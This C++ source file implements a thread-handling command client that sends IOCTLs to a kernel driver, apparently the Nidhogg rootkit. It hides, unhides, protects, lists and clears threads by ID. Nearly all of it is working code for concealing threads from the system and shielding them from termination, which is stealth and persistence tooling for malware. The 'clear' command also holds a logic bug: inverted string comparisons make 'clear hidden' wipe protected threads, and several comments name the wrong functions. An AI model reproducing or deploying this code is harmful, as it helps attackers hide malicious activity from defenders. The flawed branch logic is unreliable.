#include "pch.h"
#include "ThreadHandler.h"

/* 
 * Description:
 * HandleCommand is responsible for handling a thread related command.
 *
 * Parameters:
 * @command [_In_ std::string] -- The command to be handled.
 *
 * Returns:
 * There is no return value.
 */
void ThreadHandler::HandleCommand(_In_ std::string command) {
	std::vector<std::string> params = SplitStringBySpace(command);
	std::string commandName = params.at(0);
	params.erase(params.begin());

	if (commandName.compare("add") == 0 || commandName.compare("protect") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD tid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Protect(tid, true) ? std::cout << "Thread " << tid << " protected" << std::endl :
			std::cerr << "Failed to protect thread " << tid << std::endl;
	}
	else if (commandName.compare("remove") == 0 || commandName.compare("unprotect") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD tid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Protect(tid, false) ? std::cout << "Removed protection for thread " << tid << std::endl :
			std::cerr << "Failed to remove protection for thread " << tid << std::endl;
	}
	else if (commandName.compare("hide") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD tid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Hide(tid, true) ? std::cout << "Thread " << tid << " is now hidden" << std::endl :
			std::cerr << "Failed to hide thread " << tid << std::endl;
	}
	else if (commandName.compare("unhide") == 0 || commandName.compare("restore") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD tid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Hide(tid, false) ? std::cout << "Thread " << tid << " is now revealed" << std::endl :
			std::cerr << "Failed to reveal thread " << tid << std::endl;
	}
	else if (commandName.compare("list") == 0) {
		if (params.size() != 1) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		std::string threadType = params.at(0);

		if (threadType.compare("hidden") == 0) {
			std::vector<DWORD> hiddenThreads;

			try {
				hiddenThreads = ListThreads(ThreadType::Hidden);
			}
			catch (ThreadHandlerException& e) {
				std::cerr << e.what() << std::endl;
				return;
			}
			std::cout << "[+] Hidden threads:" << std::endl;

			for (DWORD tid : hiddenThreads) {
				std::cout << "\t" << tid << std::endl;
			}
			return;
		}
		else if (threadType.compare("protected") == 0) {
			std::vector<DWORD> protectedThreads;

			try {
				protectedThreads = ListThreads(ThreadType::Protected);
			}
			catch (ThreadHandlerException& e) {
				std::cerr << e.what() << std::endl;
				return;
			}
			std::cout << "[+] Protected threads:" << std::endl;

			for (DWORD tid : protectedThreads) {
				std::cout << "\t" << tid << std::endl;
			}
		}
		else {
			std::cerr << "Invalid option!" << std::endl;
			PrintHelp();
		}
	}
	else if (commandName.compare("clear") == 0) {
		if (params.size() != 1) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		std::string threadType = params.at(0);

		if (threadType.compare("protected") != 0) {
			ClearThreads(ThreadType::Protected) ? std::cout << "All protected threads cleared" << std::endl :
				std::cerr << "Failed to clear protected threads" << std::endl;
		}
		else if (threadType.compare("hidden") == 0) {
			ClearThreads(ThreadType::Hidden) ? std::cout << "All hidden threads cleared" << std::endl :
				std::cerr << "Failed to clear hidden threads" << std::endl;
		}
		else if (threadType.compare("all") != 0) {
			ClearThreads(ThreadType::All) ? std::cout << "All threads cleared" << std::endl :
				std::cerr << "Failed to clear all threads" << std::endl;
		}
		else {
			std::cerr << "Invalid option!" << std::endl;
			PrintHelp();
		}
	}
	else {
		std::cerr << "Invalid option!" << std::endl;
		PrintHelp();
	}
}

/*
* Description:
* CheckInput is responsible for checking the input parameters for the thread commands.
*
* Parameters:
* @params [_In_ const std::vector<std::string>&] -- The input parameters to be checked.
*
* Returns:
* @bool											 -- Whether the input parameters are valid or not.
*/
bool ThreadHandler::CheckInput(_In_ const std::vector<std::string>& params) {
	if (params.size() != 1) {
		std::cerr << "Invalid usage" << std::endl;
		return false;
	}
	return std::all_of(params.at(0).begin(), params.at(0).end(), ::isdigit);
}

/*
 * Description:
 * Protect is responsible for issuing a IOCTL_PROTECT_UNPROTECT_THREAD to protect or unprotect a thread.
 *
 * Parameters:
 * @tid	   [_In_ DWORD] -- The thread id to be protected or unprotected.
 * @protect [_In_ bool]  -- Whether to protect or unprotect the thread.
 *
 * Returns:
 * @bool					-- Whether the operation was successful or not.
 */ 
bool ThreadHandler::Protect(_In_ DWORD tid, _In_ bool protect) {
	DWORD returned;
	IoctlThreadEntry protectedThread = { tid, protect };
	return DeviceIoControl(*hNidhogg.get(), IOCTL_PROTECT_UNPROTECT_THREAD, &protectedThread, sizeof(protectedThread),
		nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * Hide is responsible for issuing a IOCTL_HIDE_UNHIDE_THREAD to hide or unhide a thread.
 *
 * Parameters:
 * @tid  [_In_ DWORD] -- The thread id to be hidden or unhidden.
 * @hide [_In_ bool]  -- Whether to hide or unhide the thread.
 *
 * Returns:
 * @bool				 -- Whether the operation was successful or not.
 */
bool ThreadHandler::Hide(_In_ DWORD tid, _In_ bool hide) {
	DWORD returned;
	IoctlThreadEntry hiddenThread = { tid, hide };
	return DeviceIoControl(*hNidhogg.get(), IOCTL_HIDE_UNHIDE_THREAD, &hiddenThread, sizeof(hiddenThread), nullptr, 0,
		&returned, nullptr);
}

/*
 * Description:
 * ListProtectedThreads is responsible for issuing a IOCTL_QUERY_PROTECTED_THREADS to get all protected threads.
 *
 * Parameters:
 * There are no parameters
 *
 * Returns:
 * @pids [std::vector<DWORD>] -- Protected TIDs.
 */
std::vector<DWORD> ThreadHandler::ListThreads(_In_ ThreadType type) {
	DWORD returned;
	std::vector<DWORD> tids{};
	IoctlThreadList result{};
	result.Type = type;

	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_THREADS, &result, sizeof(result), &result, sizeof(result), &returned,
		nullptr)) {
		return tids;
	}

	if (result.Count > 0) {
		try {
			result.Threads = SafeAlloc<DWORD*>(result.Count * sizeof(DWORD));
		}
		catch (const SafeMemoryException&) {
			throw ThreadHandlerException("Failed to allocate thread list");
		}
		if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_THREADS, &result, sizeof(result), &result, sizeof(result), &returned,
			nullptr)) {
			SafeFree(result.Threads);
			throw ThreadHandlerException("Failed to get thread list");
		}
		for (ULONG i = 0; i < result.Count; i++)
			tids.push_back(result.Threads[i]);
		SafeFree(result.Threads);
	}
	return tids;
}

/*
 * Description:
 * ClearProtectedThreads is responsible for issuing a IOCTL_CLEAR_PROTECTED_THREADS to clear all protected threads.
 *
 * Parameters:
 * There are no parameters
 *
 * Returns:
 * @bool				 -- Whether the operation was successful or not.
 */
bool ThreadHandler::ClearThreads(_In_ ThreadType type) {
	DWORD returned;
	return DeviceIoControl(*hNidhogg.get(), IOCTL_CLEAR_THREADS, &type, sizeof(type), nullptr, 0, &returned, nullptr);
}